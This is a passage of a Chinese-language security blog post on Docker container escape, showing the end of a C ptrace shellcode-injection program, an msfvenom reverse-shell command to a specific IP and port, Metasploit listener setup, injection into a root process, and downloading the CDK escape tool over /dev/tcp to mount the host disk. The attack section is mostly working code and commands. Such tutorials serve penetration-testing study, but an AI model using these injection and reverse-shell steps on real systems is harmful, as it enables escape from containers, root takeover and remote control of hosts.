class="type">uint32_t</span> *) src;</span><br><span class="line">  <span class="type">uint32_t</span> *d = (<span class="type">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="type">int</span>                     syscall;</span><br><span class="line">  <span class="type">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="type">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="type">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="type">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后启动msf，生成shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=156.238.233.113 LPORT=4567 -f c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509130451534.png" alt="image-20250509130451534"></p>
+<p>生成shellcode后替换掉进程注入c文件中的shellcode部分。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509131009000.png" alt="image-20250509131009000"></p>
+<p>查看 进程信息，找个 root 用户的进程进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">./inject &lt;pid的值&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509132835792.png" alt="image-20250509132835792"></p>
+<p>我们先开启msf的监听好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">set payload linux/x64/shell_reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4567</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后我们进行进程注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./inject 1183940</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509140648298.png" alt="image-20250509140648298"></p>
+<p>这里寻找可用进程我找了一小会。<code>/bin/bash</code>一眼顶针。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509140748501.png" alt="image-20250509140748501"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509141000422.png" alt="image-20250509141000422"></p>
+<h3 id="容器漏洞-内核漏洞"><a href="#容器漏洞-内核漏洞" class="headerlink" title="容器漏洞&#x2F;内核漏洞"></a>容器漏洞&#x2F;内核漏洞</h3><p>这里其实就是docker的历史漏洞或者一些内核漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --privileged dockerescape:v1 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们展示一下cdk一把梭，</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></p>
+<p>需要先将工具直接传到 拿下的 docker 容器里。</p>
+<p>上传方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4567 &lt; cdk_linux_amd64</span><br></pre></td></tr></table></figure>
+
+<p>然后在拿下的 docker 容器里面执行命令进行获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt; /dev/tcp/156.238.233.113/4567 &gt; cdk_linux_amd64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509143256217.png" alt="image-20250509143256217"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509143315029.png" alt="image-20250509143315029"></p>
+<p>首先进行一下信息收集：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./cdk_linux_amd64</span><br><span class="line">./cdk_linux_amd64 evaluate</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509144706363.png" alt="image-20250509144706363"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk_linux_amd64 run mount-disk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509144752626.png" alt="image-20250509144752626"></p>
+<p>然后我们进目录看一下，发现成功挂载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509144827388.png" alt="image-20250509144827388"></p>
+<p>后续的操作其实就跟先前所说的定时任务反弹shell和写入ssh公钥相同了。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17111">https://xz.aliyun.com/news/17111</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About me</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E7%8E%AF%E5%A2%83%E5%88%A4%E6%96%AD"><span class="toc-number">1.</span> <span class="toc-text">Docker环境判断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">查看根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.</span> <span class="toc-text">查看系统环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">Docker逃逸方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">特权模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.1.1.</span> <span class="toc-text">定时任务反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">写入ssh公钥</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-API%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">Docker API未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Socket%E9%80%83%E9%80%B8"><span class="toc-number">2.3.</span> <span class="toc-text">Docker Socket逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Procfs%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD"><span class="toc-number">2.4.</span> <span class="toc-text">Docker Procfs危险挂载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cgroup%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">2.5.</span> <span class="toc-text">Cgroup配置错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYS-PTRACE-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">SYS_PTRACE 进程注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.7.</span> <span class="toc-text">容器漏洞&#x2F;内核漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&text=Docker Escape Summary"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&is_video=false&description=Docker Escape Summary"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Docker Escape Summary&body=Check out this article: http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&name=Docker Escape Summary&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&t=Docker Escape Summary"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        Meteor_Kai
+        <br>
+        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">Home</a></li><!--
+                --><!--
+                --><li><a href="/about/">About me</a></li><!--
+                --><!--
+                --><li><a href="/archives/">Writing</a></li><!--
+                --><!--
+                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+                --><!--
+                --><li><a href="/search/">Search</a></li><!--
+                --><!--
+                --><li><a href="/categories/">categories</a></li><!--
+                --><!--
+                --><li><a href="/tags/">tags</a></li><!--
+                --><!--
+                --><li><a href="/links/">links</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
